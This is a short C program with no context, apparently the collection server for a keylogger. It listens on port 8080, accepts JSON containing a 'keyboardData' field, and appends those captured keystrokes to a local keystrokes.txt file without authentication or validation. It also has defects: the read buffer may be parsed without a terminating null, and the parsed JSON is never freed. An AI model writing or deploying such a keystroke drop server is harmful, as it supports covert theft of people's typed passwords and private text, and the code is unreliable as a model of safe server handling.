#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <json-c/json.h>

#define PORT 8080
#define BUFFER_SIZE 1024

// Function prototypes
void handle_client(int client_socket);
void save_keystrokes(const char *data);
void send_response(int client_socket, const char *response);

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Binding socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("Server is running on port %d...\n", PORT);

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }

        handle_client(new_socket);
        close(new_socket);
    }

    return 0;
}

void handle_client(int client_socket) {
    char buffer[BUFFER_SIZE] = {0};
    int read_size;

    read_size = read(client_socket, buffer, BUFFER_SIZE);
    if (read_size < 0) {
        perror("read");
        return;
    }

    // Parse JSON data
    struct json_object *parsed_json;
    struct json_object *keyboard_data;

    parsed_json = json_tokener_parse(buffer);
    if (json_object_object_get_ex(parsed_json, "keyboardData", &keyboard_data)) {
        const char *data = json_object_get_string(keyboard_data);
        save_keystrokes(data);
    }

    // Respond to client
    send_response(client_socket, "{\"status\": \"success\", \"message\": \"Data received successfully\"}");
}

void save_keystrokes(const char *data) {
    FILE *file = fopen("keystrokes.txt", "a");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "%s\n", data);
    fclose(file);
}

void send_response(int client_socket, const char *response) {
    write(client_socket, response, strlen(response));
}
